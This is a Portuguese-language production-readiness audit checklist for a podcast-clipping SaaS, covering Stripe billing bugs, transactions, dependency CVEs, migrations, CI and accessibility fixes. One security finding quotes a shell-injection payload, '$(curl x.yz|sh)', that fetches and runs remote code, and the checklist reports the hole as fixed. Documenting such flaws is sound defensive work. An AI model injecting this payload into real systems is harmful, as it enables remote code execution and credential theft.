# Checklist de Prontidão para Produção (Go-Live)

**Data da auditoria:** 2026-10-02  
**Especialistas:** devops-specialist, security-specialist, domain-specialist, qa-specialist, frontend-specialist, accessibility-tester  
**Propósito:** Checklist consolidado de todos os bloqueadores (BLOCKER), itens de alta prioridade (HIGH) e melhorias (NICE) que impedem o lançamento em produção.

---

## BLOCKER — Impedem Lançamento

Estes itens **devem** ser corrigidos antes de qualquer release para produção.

### Billing e Stripe

- [x] **Taxonomia de planos divergente causa under-provisioning de créditos** — Código define `UserPlan = "STARTER"|"STUDIO"|"CREATOR"|"PRO_STUDIO"`, mas checkout real usa price IDs `starter_monthly/annual` e `pro_monthly/annual`. `ProcessSubscriptionCheckoutUseCase` compara contra env vars nunca encontradas (`STRIPE_CREATOR_SUBSCRIPTION_PRICE_ID`), caindo sempre no fallback `plan="CREATOR"` (150 créditos) mesmo pra clientes Pro (300 créditos).  
  **Evidência:** `src/domain/entities/user.ts:22`, `src/actions/stripe.ts:18-27`, `src/application/use-cases/credits/process-subscription-checkout.use-case.ts:48-57`, `src/inngest/functions.ts:575-576`, `prisma/schema.prisma:44`  
  **Origem:** domain-specialist, security-specialist  
  **Resolvido:** `PlanCatalogService` criado como fonte única da verdade, mapeando os 4 price IDs reais (Starter mensal/anual, Pro mensal/anual) para créditos corretos. `UserPlan` estreitado para apenas `"STARTER"|"PRO"`. Migration `20260928000000_restrict_user_subscription_plan_values` normaliza e adiciona CHECK constraint. Testes cobrindo os 4 planos e rejeição de price ID desconhecido.

- [x] **Webhook Stripe não trata pagamentos falhados, reembolsos ou chargebacks** — Handler em `src/app/api/webhooks/stripe/route.ts:60-191` trata apenas `checkout.session.completed`, `invoice.payment_succeeded`, `customer.subscription.updated`, `customer.subscription.deleted`. Sem tratamento para `invoice.payment_failed`, `charge.refunded`, `charge.dispute.created` — cartão recusado não revoga acesso, reembolso/chargeback não revoga créditos.  
  **Evidência:** `src/app/api/webhooks/stripe/route.ts:60-191`  
  **Origem:** security-specialist, domain-specialist  
  **Resolvido:** Implementados 3 novos tipos de evento com padrão robusto de idempotência (checar `isProcessed` → `await` dispatch → marcar processado depois de confirmado → 503 se falhar).
  - `invoice.payment_failed`: novo use case `ProcessPaymentFailedUseCase` marca `Subscription.status = "past_due"` imediatamente (reação própria do domínio, não delegada ao timing de dunning do Stripe). Créditos/acesso continuam normais durante carência de 3 dias.
  - Carência de 3 dias: migration `20261003000000_add_subscription_past_due_at` adiciona campo `pastDueAt: DateTime?`. Novo use case `SuspendExpiredPastDueSubscriptionsUseCase` (Inngest agendada) revoga acesso de `past_due` com mais de 3 dias sem resolução.
  - `invoice.payment_succeeded` durante carência: novo use case `ResolvePastDueGracePeriodUseCase` reverte `past_due` → `active` e limpa `pastDueAt`.
  - `charge.refunded`: novo use case `ProcessChargeRefundUseCase` revoga créditos do período afetado apenas (reutiliza helper `revoke-subscription-credits.helper.ts`), sem suspender conta.
  - `charge.dispute.created`: novo use case `ProcessChargeDisputeUseCase`, mesmo comportamento de refund.
  - TDD: 6 testes de integração em `tests/integration/stripe-webhook-payment-failure.integration.test.ts` (vermelho antes da implementação, verde depois). Suíte completa: 624 testes passando.

- [x] **Deduplicação de webhook Stripe com race condition crítica** — Evento marcado como processado (BD) ANTES do dispatch ao Inngest ser completado. Em serverless, se instância congelar após 200 OK, créditos nunca são aplicados; Stripe acredita que já processou e não reenvia.  
  **Evidência:** `src/app/api/webhooks/stripe/route.ts:48-58`, `src/infrastructure/queue/stripe-queue.ts:203-213` (fire-and-forget)  
  **Origem:** security-specialist, domain-specialist  
  **Resolvido:** `src/app/api/webhooks/stripe/route.ts` agora checa `isProcessed` → `await` o dispatch → marca como processado DEPOIS de confirmar sucesso. Se dispatch falhar, responde 503 (não 200), permitindo Stripe reenviar. `event.id` do Stripe passado como chave de idempotência nativa ao `inngest.send()`. Erro de `inngest.send` agora propaga ao chamador em vez de fallback silencioso. TDD rigoroso: primeira versão dos testes teve asserções condicionais que não ficavam vermelhas (falha de metodologia identificada e corrigida); versão final: 4 testes genuinamente vermelho→verde em `tests/integration/stripe-webhook-idempotency.integration.test.ts`. Suíte completa: 616 testes passando.

- [x] **Pacotes avulsos (one-time credits) descontinuados ainda estão no código** — `AddCreditsFromStripeWebhookUseCase` (`src/application/use-cases/credits/add-credits-from-stripe.use-case.ts:31-48`) continua processando pacotes (smallPackPriceId, mediumPackPriceId, largePackPriceId) apesar da spec aprovada (`../historico/superpowers/specs/2026-09-14-recurring-subscriptions-and-credit-packs-design.md:12`) descontinuar essa venda. `src/env.js:27-29` mantém defaults fake (`"price_small"`).  
  **Evidência:** `src/application/use-cases/credits/add-credits-from-stripe.use-case.ts`, `src/env.js:27-29`  
  **Origem:** domain-specialist  
  **Resolvido:** Pacotes avulsos removidos do código e env vars correspondentes removidas de `env.js`. Migration `20260928000000_restrict_user_subscription_plan_values` normaliza dados legados.

- [x] **`PrismaUnitOfWork` não garantia atomicidade real nas operações de crédito** — `db.$transaction(async () => operation())` abria uma transação Prisma mas ignorava o `TransactionClient` (`tx`) recebido no callback; `operation()` era chamado sem argumento nenhum. Os repositórios usados dentro de `operation()` (`PrismaUserRepository`, `PrismaCreditTransactionRepository`, etc., instanciados via `src/infrastructure/factories/use-case-factories.ts`) importam `db` global de `src/server/db.ts` diretamente, não o `tx`. Resultado: cada escrita dentro de uma "unidade de trabalho" de crédito/billing comitava isolada e imediatamente no banco real, fora da transação — se um use case fazia 2+ escritas (ex.: debitar `User.credits` + criar `CreditTransaction`) e a segunda falhasse, a primeira já tinha sido persistida, sem rollback nenhum apesar do código "parecer" transacional. Afetava todos os use cases em `src/application/use-cases/credits/*.ts` (hold, consume, refund, checkout/renovação/expiração de assinatura, payment failed, refund/dispute de charge, grace period).  
  **Evidência:** `src/infrastructure/database/repositories/prisma-unit-of-work.ts` (versão anterior ao fix), `src/domain/ports/unit-of-work.ts`, `src/server/db.ts` (Proxy + `dbTransactionContext`/`AsyncLocalStorage` usado para redirecionar `db.*` para a transação ativa)  
  **Origem:** domain-specialist  
  **Resolvido:** `PrismaUnitOfWork.execute()` agora abre a transação via `db.$transaction(async (tx) => ...)` e popula `dbTransactionContext` (o mesmo `AsyncLocalStorage` já usado por `tests/helpers/with-rollback-transaction.ts`) com `{ tx }` via `dbTransactionContext.run({ tx }, operation)`, envolvendo a chamada de `operation()`. Isso redireciona automaticamente qualquer `db.*` chamado pelos repositórios dentro da unidade de trabalho para a transação real, sem alterar a interface pública `IUnitOfWork.execute<T>(operation: () => Promise<T>): Promise<T>` nem os call sites dos use cases. TDD: novo teste de integração `tests/integration/prisma-unit-of-work-atomicity.integration.test.ts` prova o bug (vermelho: saldo do usuário ficava debitado mesmo com a 2ª escrita — registro de `CreditTransaction` — falhando de propósito) e a correção (verde: rollback real, saldo intocado). Deliberadamente **não** usa o padrão de transação+rollback de isolamento de testes (`with-rollback-transaction.ts`): rodar dentro dele mascararia o bug, pois o mecanismo de `SAVEPOINT` do Proxy em `db.ts` já garante atomicidade por si só quando há uma transação de teste ativa, independente do código de produção estar correto. Suíte completa validada contra banco Postgres novo (`prisma migrate deploy` + `vitest run`): 84/84 testes de integração relevantes passando (12 falhas pré-existentes de `health-check.test.ts`/`legal-pages.test.ts` são de ambiente — dependem de servidor Next já rodando — e já documentadas no item "Chave Clerk" em HIGH → Infraestrutura, não relacionadas a esta mudança), `tests/integration/credit-service.test.ts` (testes de concorrência) 7/7, `npm run test` (unitários, com `InMemoryUnitOfWork`) 605 passed | 8 skipped, `npm run check` (lint + typecheck) sem erros.

- [x] **Cobrança divergente do modo de processamento (cortes manuais cobrados como automáticos)** — Mesma classe do BLOCKER de cortes manuais: o hold de crédito lia `event.data.mode`, enquanto o payload enviado ao GPU derivava `mode` da presença de cortes (`buildProcessVideoPayload`). Com cortes e `mode` omitido/`"auto"`, o usuário pagava 1 crédito pelo preço automático e o GPU processava até 50 clipes manuais.  
  **Evidência:** `ai-podcast-clipper-frontend/src/inngest/functions.ts` (guards em ~linhas 216-234, antes de `makeHoldCreditsUseCase`), `src/domain/errors/manual-cuts-mode-mismatch-error.ts`  
  **Origem:** auditoria de segurança pós-correção de cortes manuais (2026-10-09)  
  **Resolvido (2026-10-09):** `ManualCutsModeMismatchError` rejeita a requisição antes da reserva quando há cortes e `mode !== "manual"`. Decisão de produto confirmada pelo usuário: rejeitar, não cobrar como manual. Testes: `tests/unit/inngest/manual-cuts-billing-consistency.test.ts` (unit, `mode` omitido e `'auto'`) e `tests/integration/manual-cuts-billing-consistency.integration.test.ts` (nenhuma reserva de crédito, GPU não chamado, arquivo marcado como `failed`). Regra: RN-PIPE-MANUAL-15.

### Segurança

- [x] **Next.js 15.3.2 com CVEs críticas não patcheadas** — `npm audit` reporta 2 critical (RCE no protocolo React Flight, exposição de código-fonte de Server Actions), 5 high, 22 moderate. App usa intensamente App Router + Server Actions (superfície de ataque direta).  
  **Evidência:** `npm audit` output, `package.json`  
  **Origem:** security-specialist  
  **Resolvido:** Next.js atualizado de 15.3.2 para 15.5.27 (went beyond minimal patch para corrigir 2 CVEs adicionais: RCE em Windows e na API de otimização de imagem AVIF, ambas só corrigidas a partir da 15.5.24). `npm audit` do pacote `next` sem mais advisories diretas. Build e testes passam. Novo item HIGH descoberto: 1 critical remanescente no AWS SDK (`fast-xml-parser` via `@aws-sdk/client-s3`), pendente de task separada para atualizar AWS SDK v3. **Atualização (2026-10-08):** Next.js evoluído de 15.5.27 para 16.4.0 (com `eslint-config-next` no mesmo major) para eliminar a cadeia de vulnerabilidades do `npm audit` — ver item de dependências npm em HIGH → Segurança.

- [x] **Regra de lifecycle do S3 quebra clipes em 24h** — `./aws-s3-lifecycle-rules.md:15-19` documenta expiração de `uploads/`/`youtube/` em 1 dia, manter `clips/` pra sempre. Backend grava o clipe final na MESMA pasta do vídeo original (`ai-podcast-clipper-backend/main.py:232-233`), nunca em `clips/`. Se aplicadas, regras destroem todos os clipes 24h após processamento.  
  **Evidência:** `./aws-s3-lifecycle-rules.md:15-19`, `ai-podcast-clipper-backend/main.py:232-233`, `generate-upload-url.use-case.ts:20`, `import-youtube-video.use-case.ts:27`  
  **Origem:** security-specialist, devops-specialist  
  **Resolvido:** Pipeline backend consolidado em módulos compartilhados (`core/`), incluindo `s3_paths.py` que garante clipes finais gravados em `clips/` (em vez da mesma pasta do vídeo original). TDD: teste vermelho → implementação → verde.

- [x] **RCE via `preset` em `subprocess.run(..., shell=True)` — execução de comando no container de GPU — RESOLVIDO (2026-10-09)** — `core/subtitles.py` montava o comando ffmpeg de legendas como string com o campo `preset` controlado pelo usuário e executava com `shell=True`. O único controle era um limite de 50 caracteres. Um preset como `"$(curl x.yz|sh)"` executaria comando arbitrário no container, que tem credenciais AWS, `GEMINI_API_KEY` e `AUTH_TOKEN`.  
  **Evidência:** `ai-podcast-clipper-backend/core/subtitles.py` (ffmpeg via lista de argumentos, `subprocess.run(ffmpeg_cmd, shell=False, check=True)`), `core/schemas.py` (`SubtitlePreset` e `SUBTITLE_PRESETS`, `ProcessVideoRequest.preset`), `ai-podcast-clipper-frontend/src/domain/schemas/process-video.schema.ts` e `import-youtube-video.schema.ts` (`z.enum(PROJECT_SUBTITLE_PRESETS)`)  
  **Origem:** auditoria de segurança pós-correção de cortes manuais (2026-10-09)  
  **Resolvido:** `shell=False` elimina a classe de vulnerabilidade no caminho de legendas, independente de allowlist. Além disso, `preset` aceita só 12 valores (os 11 da UI, incluindo `NONE`, mais o alias legado `CLEAN`) e qualquer outro gera 422 antes do pipeline. Testes: `ai-podcast-clipper-backend/tests/test_preset_shell_injection.py` (allowlist, default HORMOZI, ffmpeg chamado sem shell), `tests/test_local_server.py::test_shell_metachar_preset_returns_422_before_pipeline`, `tests/test_subtitles.py`; frontend `tests/unit/domain/schemas/process-video.schema.test.ts` e `import-youtube-video.schema.test.ts`. Regra: RN-PIPE-PRESET-01 e RNF-SEC-16. **Pendências desta rodada** (5 outros `shell=True` e gaps de `NONE` e de dados legados) listadas abaixo, em "Pendências abertas da auditoria de segurança (2026-10-09)".

- [x] **Entrada de corte manual aceitava `NaN`/`Infinity` e título sem limite no backend** — `end=NaN` passava por todas as validações de `ManualCut`, porque o JSON do Python aceita esses literais. O frontend já limitava o título a 200 caracteres; o backend não limitava.  
  **Evidência:** `ai-podcast-clipper-backend/core/schemas.py` (`ConfigDict(extra="forbid", allow_inf_nan=False)`, `MAX_MANUAL_CUT_TITLE_LENGTH = 200`, `Field(max_length=...)`)  
  **Origem:** auditoria de segurança pós-correção de cortes manuais (2026-10-09)  
  **Resolvido (2026-10-09):** teste `ai-podcast-clipper-backend/tests/test_manual_cut_input_hardening.py` (NaN/Infinity em `start`/`end`, inclusive via JSON bruto; título acima de 200 → 422; título no limite aceito). Regra: RN-PIPE-MANUAL-04.

### Infraestrutura e Deploy

- [x] **Submódulo Git `asd/` órfão impede clone e deploy** — `ai-podcast-clipper-backend/asd/` está listado como gitlink (modo 160000) no tree, mas não existe `.gitmodules` no repo. Clone novo gera pasta vazia. `main.py:66` (`.add_local_dir`) e `main.py:269-275` (uso em runtime) dependem do conteúdo — Modal deploy falharia.  
  **Evidência:** `git ls-tree HEAD | grep asd`, ausência de `.gitmodules`, `ai-podcast-clipper-backend/main.py:66,269-275`  
  **Origem:** devops-specialist  
  **Resolvido:** Criado `.gitmodules` apontando para repo Light-ASD (commit `ed38c23`). Validado ponta a ponta: clone novo simulado + `git submodule update --init` popula corretamente; suíte de testes do backend rodou 71/71 (venv completo) e 63/63 (venv leve) após clone simulado.

- [x] **Testes do backend (`local_server.py`) não estão no repositório** — Arquivos `ai-podcast-clipper-backend/local_server.py` e `tests/test_local_server.py` estão em `.gitignore` (linhas 1-2) mas nunca foram commitados. Job `backend-local-server` do `.github/workflows/ci.yml` roda `pytest tests/test_local_server.py` — coleta de testes falharia em produção.  
  **Evidência:** `ai-podcast-clipper-backend/.gitignore:1-2`, `.github/workflows/ci.yml` job `backend-local-server`  
  **Origem:** devops-specialist  
  **Resolvido:** Pipeline backend consolidado: lógica real extraída de `main.py` para módulos compartilhados em `core/`. `local_server.py` reescrito como wrapper fino chamando o mesmo `core/` (elimina drift). `local_server.py` e seu teste saíram do `.gitignore`, agora versionados.

- [x] **Migrações do Prisma incompletas — apenas 1 de 7 tabelas** — `ai-podcast-clipper-frontend/prisma/migrations/` contém só `20260927000000_add_processed_webhook_event`. Schema tem 7 models (`User`, `Subscription`, `CreditTransaction`, `UploadedFile`, `Clip`, `ProcessingOption`, `ProcessedWebhookEvent`). CI usa `prisma db push --skip-generate`, não `migrate deploy`. Rodar em banco vazio criaria só 1 tabela; queries do app falhariam.  
  **Evidência:** `prisma/migrations/`, `prisma/schema.prisma`, `.github/workflows/ci.yml:55`  
  **Origem:** devops-specialist, qa-specialist  
  **Resolvido:** migration baseline `20260926000000_baseline_initial_schema` criada (cronologicamente anterior à `..._add_processed_webhook_event`) cobrindo as 6 tabelas que faltavam. CI (`.github/workflows/ci.yml`) passou a usar `prisma migrate deploy` em vez de `prisma db push --skip-generate`. Verificado localmente: `migrate deploy` num Postgres vazio cria as 7 tabelas e `prisma migrate diff` contra `schema.prisma` resulta vazio. Instruções para aplicar num ambiente já existente (criado via `db push`) documentadas no cabeçalho do `migration.sql` da baseline (`prisma migrate resolve --applied 20260926000000_baseline_initial_schema`); não há banco de produção real hoje, então esse passo não precisou ser executado.

### Qualidade e CI

- [x] **TypeScript: 9 erros de tipo na suíte de testes bloqueiam `npm run check`** — Incompatibilidade de tipo `Response` (undici vs fetch nativa) em `tests/integration/inngest-pipeline.test.ts:119,201,337,420` e `tests/unit/inngest/manual-cuts-pipeline.test.ts:100`; argumentos incompatíveis em `tests/unit/api/health.test.ts:10,19,29,39` (handler `GET()` não recebe argumentos, teste passa `Request`).  
  **Evidência:** Output de `npm run check` (erros de compilação)  
  **Origem:** qa-specialist  
  **Resolvido:** Os 9 erros originais mais 3 novos (introduzidos pelos testes das use cases) foram corrigidos. `npm run check` 100% verde. Suíte completa: 541 testes unitários passando.

- [x] **REGRESSÃO (descoberta em 2026-10-08): `npm run check` e `next build` voltaram a falhar — 5 erros de ESLint bloqueando lint/build** — Descoberto durante verificação pós-fix de uma tarefa de `npm audit` (não causado por ela: reproduzido também com as versões antigas de `eslint`/`@typescript-eslint/*` fixadas no `package-lock.json` anterior, via downgrade temporário `eslint@9.26.0` + `@typescript-eslint/*@8.32.0`). `next build` falha com `Failed to compile` pelos mesmos 5 erros, o que bloquearia o deploy real, não só o CI.
  **Evidência:** `SKIP_ENV_VALIDATION=1 npm run check` e `SKIP_ENV_VALIDATION=1 npm run build` (2026-10-08), ambos com saída idêntica:
  - `src/actions/generation.ts:133` — `@typescript-eslint/no-unnecessary-type-assertion` (linha introduzida no commit `e0e6d82`, 2026-09-28)
  - `src/application/use-cases/credits/resolve-past-due-grace-period.use-case.ts:52` — `@typescript-eslint/prefer-optional-chain` (commit `d432383`, 2026-10-04)
  - `src/infrastructure/database/repositories/prisma-clip.repository.ts:136` — `@typescript-eslint/no-unnecessary-type-assertion` (commit `7af1062`, 2026-09-11)
  - `src/infrastructure/database/repositories/prisma-uploaded-file.repository.ts:250` — `@typescript-eslint/no-unnecessary-type-assertion` (commit `829ebb9`, 2026-10-02)
  - `src/inngest/functions.ts:166` e `:340` — `@typescript-eslint/no-unnecessary-type-assertion` (commits `80efb90` 2026-09-29 e `cc616bd` 2026-09-11)
  **Origem:** devops-specialist (achado colateral ao investigar o CI de `npm audit`)
  **Resolvido (2026-10-08):** 13 erros de lint pré-existentes corrigidos (6 ocorrências de `no-unnecessary-type-assertion`/`prefer-optional-chain` nos arquivos listados acima, cobertas por 21 testes novos escritos antes da correção, e 7 erros `react-hooks/set-state-in-effect` introduzidos pelo `eslint-plugin-react-hooks@7.1.1` trazido pelo `eslint-config-next@16.4.0`, refatorados para padrões recomendados pelo React, com 8 testes novos). Estado verificado: `npm run check` (`eslint . && tsc --noEmit`) exit 0 com 0 erros e 7 warnings pré-existentes; `npm run build` exit 0 (23 rotas). Revisão de segurança confirmou nenhum vazamento de estado entre usuários/sessões nas refatorações.
  **Observação:** o item acima ("TypeScript: 9 erros... `npm run check` 100% verde") foi marcado resolvido em 2026-10-04, mas pelo menos 3 das linhas acima já existiam antes ou nessa mesma data — ou seja, o `npm run check` relatado como "100% verde" nessa sessão não cobriu (ou não detectou) esses 5 erros, que hoje bloqueiam `next lint` e `next build`. Não investigado a fundo o motivo da divergência (fora do escopo desta tarefa de `npm audit`); requer correção por quem tem contexto do código (ex.: `frontend-specialist`/`qa-specialist`), pois envolve lógica de billing (`resolve-past-due-grace-period.use-case.ts`) e de persistência (repositórios Prisma), não apenas estilo.

- [x] **Duas use cases sem testes unitários** — `src/application/use-cases/delete-project.use-case.ts` e `src/application/use-cases/rename-project.use-case.ts` sem cobertura, violando regra TDD obrigatória do `AGENTS.md`.  
  **Evidência:** Ausência de `*.test.ts` correspondentes  
  **Origem:** qa-specialist  
  **Resolvido:** Adicionados 26 testes novos (15 unitários + 11 integração). Confirmado: ambas as use cases já verificavam posse corretamente (sem IDOR) — não havia bug escondido.

### Produto e UX

- [x] **Upload direto de vídeo é um stub não funcional** — Decisão de produto: fluxo escondido em vez de implementado agora. `<input type="file">` + `handleUpload` (stub que mostrava sucesso falso) removidos de `src/components/dashboard/create-project-client.tsx`. App lança só com importação via YouTube + cortes manuais, ambos funcionando ponta a ponta. Infraestrutura de upload no backend (`generateUploadUrl`, `generateVideoThumbnail`) mantida intacta para reativar se decidido.  
  **Evidência:** `src/components/dashboard/create-project-client.tsx` (handleUpload removido)  
  **Origem:** frontend-specialist  
  **Resolvido na Fase 4**

- [x] **Branding de template terceiro vaza pra UI** — Nome trocado de "Studio Admin" para "Podcast Clipper" (`src/config/app-config.ts:6-12`), consistente com marca já usada na landing pública. Copyright e meta.title/description atualizados. Links "Support" pessoais de "arhamkhnz" (X/GitHub do autor do template) removidos de `src/components/dashboard/sidebar/support-card.tsx:16,26`, substituídos por `mailto:` com placeholder `suporte@PREENCHER.com.br` marcado com TODO (usuário decide e-mail real depois). Teste novo: `tests/unit/components/app-sidebar-branding.test.tsx`.  
  **Evidência:** `src/config/app-config.ts`, `src/components/dashboard/sidebar/support-card.tsx`, `tests/unit/components/app-sidebar-branding.test.tsx`  
  **Origem:** frontend-specialist  
  **Resolvido na Fase 4**

- [x] **Nenhuma página legal/compliance existe** — Criadas rotas `/terms`, `/privacy`, `/refund`, `/contact` com conteúdo padrão de SaaS em PT-BR. Todos os dados específicos da empresa (razão social, CNPJ, endereço, e-mail, jurisdição/foro) marcados com placeholder visível `[A PREENCHER: ...]` — nenhum dado jurídico foi inventado, conforme decisão do usuário de resolver depois. Política de Reembolso descreve corretamente o comportamento real implementado (carência de 3 dias, revogação de créditos só do período afetado). Links adicionados no Header (dropdown "Legal") e Footer. Checkbox de aceite de Termos/Privacidade adicionado a `custom-sign-up-form.tsx`, bloqueando submit (e-mail/senha e Google) sem aceite. 8 testes de integração novos (`tests/integration/legal-pages.test.ts`) + 3 unitários no form de cadastro.  
  **Evidência:** `src/app/terms/`, `src/app/privacy/`, `src/app/refund/`, `src/app/contact/`, `src/components/auth/custom-sign-up-form.tsx`, Header/Footer links  
  **Origem:** frontend-specialist  
  **Resolvido na Fase 4**

- [x] **Bug crítico de checkout — redirecionamento ao Stripe bloqueado** — `src/app/dashboard/billing/page.tsx:110-116`: `handleCheckout` chama `createCheckoutSession` (termina em `redirect()`, `src/actions/stripe.ts:89`) dentro de `try/catch` genérico sem `isRedirectError`. Next.js throw especial de `NEXT_REDIRECT` é engolido, disparando toast de erro e impedindo redirecionamento. Bug conhecido do App Router, não testado em staging. Risca 100% das conversões de assinatura.  
  **Evidência:** `src/app/dashboard/billing/page.tsx:110-116`, `src/actions/stripe.ts:89`, padrão do Next.js  
  **Origem:** frontend-specialist, qa-specialist  
  **Resolvido:** Criado helper reutilizável `src/lib/handle-server-action-error.ts` usando API pública `unstable_rethrow` do Next.js (confirmada disponível em 15.5.27), relançando erros de redirect/notFound do framework e tratando apenas erros de aplicação reais. Bug duplicado encontrado e corrigido também em `src/components/billing/active-subscription-card.tsx` (`handleManage`, botão de gerenciar assinatura/portal do Stripe). TDD: testes novos em `tests/unit/lib/handle-server-action-error.test.ts` e nos testes de componente de billing/active-subscription-card, confirmados vermelhos antes do fix.

### Acessibilidade (WCAG 2.1 AA)

- [x] **Botão de mute sem `aria-label`** — `aria-label` adicionado ao botão mute em `src/components/custom-video-player.tsx:103-108` — WCAG 4.1.2. Resolvido na Fase 4.  
  **Origem:** accessibility-tester

- [x] **Controles do video player inacessíveis via teclado** — Controles do video player agora visíveis e operáveis via teclado. Removida a restrição `group-hover:opacity-100`, adicionado `focus-visible:outline` para indicador visual de foco. `src/components/custom-video-player.tsx` — WCAG 2.1.1. Resolvido na Fase 4.  
  **Origem:** accessibility-tester

- [x] **Alertas de erro sem `role="alert"` ou `aria-live`** — `role="alert"` adicionado em `src/components/auth/custom-sign-in-form.tsx:88-91` e `src/components/auth/custom-sign-up-form.tsx:141-144` — WCAG 4.1.3. Resolvido na Fase 4.  
  **Origem:** accessibility-tester

- [x] **Mensagem de sucesso sem `aria-live="polite"`** — `aria-live="polite"` adicionado em `src/components/auth/custom-sign-up-form.tsx:147-151` — WCAG 4.1.3. Resolvido na Fase 4.  
  **Origem:** accessibility-tester

- [x] **Botões de ação em clip card sem `aria-label`** — `aria-label` adicionado aos botões de ação em `src/components/clip-card.tsx:125-131,158-187`, substituindo inadequado `title` — WCAG 4.1.2. Resolvido na Fase 4.  
  **Origem:** accessibility-tester

- [x] **`focus:outline-none` sem substituto visual** — `focus:outline-none` substituído por `focus:ring` (com cor e offset visível) em múltiplos componentes: `custom-sign-in-form.tsx:152,173`, `custom-sign-up-form.tsx:170,309`, `landing/pricing-section.tsx:113` — WCAG 2.4.7. Resolvido na Fase 4.  
  **Origem:** accessibility-tester

---

## RISCOS DESCOBERTOS PELA AUDITORIA DE ESPECIALISTAS (Sessão 2026-10-04)

Estes itens foram identificados por 5 especialistas durante revisão técnica dos 4 documentos de arquitetura/requisitos. Não bloqueiam lançamento imediato se forem considerados aceitáveis, mas requerem visibilidade e decisão do usuário.

### Riscos Confirmados de Implementação (Gap Funcional)

- [x] **(BLOCKER — Funcionalidade Anunciada Não Funciona) RESOLVIDO (2026-10-09) para cortes manuais.** Confirmado por 3 revisores independentes (2026-10-04): o backend Python (`core/schemas.py::ProcessVideoRequest`) só aceitava `s3_key` e `preset` — `mode`, `manual_cuts`, `aspect_ratio`, `auto_zoom`, `genre` **eram descartados silenciosamente** pelo Pydantic v2, e o backend sempre rodava o pipeline automático (com chamada ao Gemini), ignorando os cortes do usuário. O frontend também derivava `mode` de `clipModel`, que é opção de layout.
  - **Severidade original**: BLOCKER (funcionalidade anunciada não entregava no backend).
  - **Resolvido**: contrato `POST /process_video` v2, spec em `../historico/superpowers/specs/2026-10-09-manual-cuts-process-video-contract-v2-spec.md`.
    - Backend: `ProcessVideoRequest` com `extra="forbid"` (campo desconhecido → 422), `mode` `auto`/`manual`, `ManualCut` (≤ 60s, ≤ 50 cortes) em `core/schemas.py`; `core/video_probe.py` (novo) valida a duração real via ffprobe (corte além do fim do vídeo → 422); `core/video_pipeline.py::run_video_processing_pipeline(request)` é o único ponto de bifurcação e pula Gemini no modo manual.
    - Frontend: `src/application/services/process-video-payload.service.ts` deriva `mode` de cortes presentes (não de `clipModel`); `src/application/use-cases/retry-project.use-case.ts` usa `manualCutsJson`; `src/domain/errors/manual-cuts-required-error.ts` impede reserva de crédito com `mode="manual"` sem cortes.
    - Evidência (execução em 2026-10-09): backend `pytest` 130 passed; frontend `npm run test` 617 passed | 8 skipped. Testes por regra em `requisitos-funcionais-e-nao-funcionais.md` (RF-PIPE-08) e `casos-de-uso-e-regras-de-negocio.md` (RN-PIPE-MANUAL-01 a 14).
  - **Gaps conhecidos (abertos, exigem decisão)**:
    - `aspect_ratio`, `auto_zoom` e `genre` são aceitos pelo schema mas **sem efeito funcional** (decisão D1; RN-PIPE-MANUAL-12). Vira RF futuro.
    - **Novo (2026-10-09):** `mode: "auto"` enviado junto com `manualCuts` passa pelos schemas Zod (`src/domain/schemas/process-video.schema.ts`, `src/domain/schemas/import-youtube-video.schema.ts`). Nesse caso o hold cobra o preço automático (usa `event.data.mode`), mas `buildProcessVideoPayload` envia `mode: "manual"` ao backend, que processa os cortes. **Mitigado (2026-10-09):** o guard `ManualCutsModeMismatchError` em `src/inngest/functions.ts` rejeita a combinação antes do hold (RN-PIPE-MANUAL-15; testes em `tests/unit/inngest/manual-cuts-billing-consistency.test.ts`). Falta apenas rejeitar na borda (Zod), o que é melhoria, não bloqueio.
    - **Novo (2026-10-09):** a importação do YouTube com cortes (`src/application/use-cases/videos/import-youtube-video.use-case.ts`) não grava `manualCutsJson`. Como o retry deriva o modo dessa coluna (D6), reprocessar esse projeto roda em modo automático e perde os cortes.
    - **Novo (2026-10-09):** o handler de 422 por duração real em `main.py` (Modal) não tem teste direto; `tests/test_main_process_video.py` só cobre o encaminhamento do request ao pipeline compartilhado.

### Riscos Não Confirmados (Suspeitas que Requerem Teste Real)

- [x] **(HIGH — Bug de Reembolso) RESOLVIDO.** CONFIRMADO em produção local em 2026-10-05: o usuário disparou um reembolso real no Stripe (modo sandbox/teste) e verificou que os créditos **não** foram revogados — a suspeita registrada abaixo (texto original mantido para histórico) deixou de ser hipótese e passou a bug reproduzido.
  - **Causa raiz**: `src/app/api/webhooks/stripe/route.ts` (bloco `charge.refunded` de `dispatchStripeEventForProcessing`) lia `refundAmountCents` somando `charge.refunds?.data ?? []`. O campo `refunds.data` só vem preenchido se a chamada à API do Stripe expandir explicitamente esse campo (`expand: ['refunds']`) — o que **nunca** acontece no payload padrão de webhook. Na prática, `charge.refunds` chegava `undefined`, o `.reduce` sobre `[]` resultava em `0`, e `ProcessChargeRefundUseCase` sempre recebia `refundAmountCents: 0`, pulando a revogação (`creditsToRevoke <= 0` → `return { success: false, revokedCredits: 0 }`) silenciosamente — sem erro, sem log de falha, parecendo que tudo funcionava.
  - **Fix aplicado**: troca da leitura para `charge.amount_refunded` — campo numérico em centavos, **cumulativo**, sempre presente no objeto `Charge` do Stripe sem precisar de expansão (representa o total já reembolsado daquele charge, incluindo reembolsos parciais anteriores). O tipo inline do `charge` em `route.ts` foi atualizado para refletir `amount_refunded?: number` no lugar de `refunds?: {...}`. Conferido que `ProcessChargeRefundUseCase`/`revokeSubscriptionCreditsForChargeEvent` já tratam o valor recebido como um total único (sem somar arrays por conta própria), então não há dupla contagem introduzida pela natureza cumulativa do campo.
  - **Teste**: `tests/integration/stripe-webhook-payment-failure.integration.test.ts` (Cenário 3) — 2 dos 3 testes do cenário (reembolso "simples" e reembolso total 100%) ficaram verdes com o fix. O terceiro teste ("reembolso parcial... revoga créditos proporcionais") continua vermelho por um motivo **não relacionado** ao bug confirmado: ele usa `refundAmount: 1500` centavos como "parcial", mas o preço de referência do plano STARTER (`PlanCatalogService.getMonthlyPriceCentsForPlan`) também é 1500 centavos ($15,00/mês, conforme `docs/historico/superpowers/specs/2026-09-14-recurring-subscriptions-and-credit-packs-design.md`) — ou seja, o valor do teste representa matematicamente um reembolso de 100% (não parcial) do preço mensal, e `CreditPricingService.calculateCreditsToRevokeForRefund` revoga corretamente 100% dos créditos nesse caso (comportamento documentado no próprio domain service, não é regressão). Esse teste específico tem uma inconsistência de dados pré-existente (precisaria de um valor genuinamente menor que 1500, ex. 750 centavos, para exercitar revogação parcial) e não foi alterado nesta tarefa — ver nota em `progress.md`.

<details>
<summary>Texto original da suspeita (2026-10-04), mantido para histórico</summary>

